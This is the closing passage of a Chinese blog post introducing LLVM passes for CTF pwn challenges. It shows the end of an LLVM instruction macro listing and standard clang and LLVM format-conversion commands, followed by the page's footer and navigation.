class="meta">#<span class="keyword">undef</span>  FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_CAST_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_FUNCLETPAD_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_OTHER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_USER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h2 id="格式转化"><a href="#格式转化" class="headerlink" title="格式转化"></a>格式转化</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>llvm-pass初识</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/10060/">https://ixout.github.io/posts/10060/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-04-12</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-04-18</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/llvm-pass/">llvm-pass</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/33061/" title="dubhe2024-ggbond复现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1ccabf1b.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">dubhe2024-ggbond复现</div></div></a></div><div class="next-post pull-right"><a href="/posts/46596/" title="protobuf初识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2c09c340e57a4963ba60fdc0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">protobuf初识</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="iconfont icon-github1"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">56</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">64</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#llvm"><span class="toc-number">1.</span> <span class="toc-text">llvm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2021redhat-simpleVM"><span class="toc-number">2.1.</span> <span class="toc-text">2021redhat-simpleVM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2021ciscn-satool"><span class="toc-number">2.2.</span> <span class="toc-text">2021ciscn-satool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2022qwb-yakagame"><span class="toc-number">2.3.</span> <span class="toc-text">2022qwb-yakagame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2022ciscn-satool"><span class="toc-number">2.4.</span> <span class="toc-text">2022ciscn-satool</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BE%E9%81%97"><span class="toc-number">3.</span> <span class="toc-text">拾遗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.1.</span> <span class="toc-text">逆向定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text">gdb调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opt"><span class="toc-number">3.3.</span> <span class="toc-text">opt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opcode"><span class="toc-number">3.4.</span> <span class="toc-text">opcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E8%BD%AC%E5%8C%96"><span class="toc-number">3.5.</span> <span class="toc-text">格式转化</span></a></li></ol></li></ol></div></div><div class="card-widget card-recommend-post"><div class="item-headline"><i class="fas fa-dharmachakra"></i><span>相关推荐</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/21638/" title="FCTF"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" alt="FCTF"></a><div class="content"><a class="title" href="/posts/21638/" title="FCTF">FCTF</a><time datetime="2023-04-18" title="发表于 2023-04-18">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/35200/" title="ida伪代码生成失败应对"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg" alt="ida伪代码生成失败应对"></a><div class="content"><a class="title" href="/posts/35200/" title="ida伪代码生成失败应对">ida伪代码生成失败应对</a><time datetime="2023-06-26" title="发表于 2023-06-26">2023-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1518/" title="file虚表函数学习"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1536aeca2.jpg" alt="file虚表函数学习"></a><div class="content"><a class="title" href="/posts/1518/" title="file虚表函数学习">file虚表函数学习</a><time datetime="2023-10-19" title="发表于 2023-10-19">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/49295/" title="how2heap"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg" alt="how2heap"></a><div class="content"><a class="title" href="/posts/49295/" title="how2heap">how2heap</a><time datetime="2023-08-19" title="发表于 2023-08-19">2023-08-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/53436/" title="windows pwn"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1536aeca2.jpg" alt="windows pwn"></a><div class="content"><a class="title" href="/posts/53436/" title="windows pwn">windows pwn</a><time datetime="2024-02-03" title="发表于 2024-02-03">2024-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/49884/" title="关于流与正反连shell"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg" alt="关于流与正反连shell"></a><div class="content"><a class="title" href="/posts/49884/" title="关于流与正反连shell">关于流与正反连shell</a><time datetime="2024-03-11" title="发表于 2024-03-11">2024-03-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>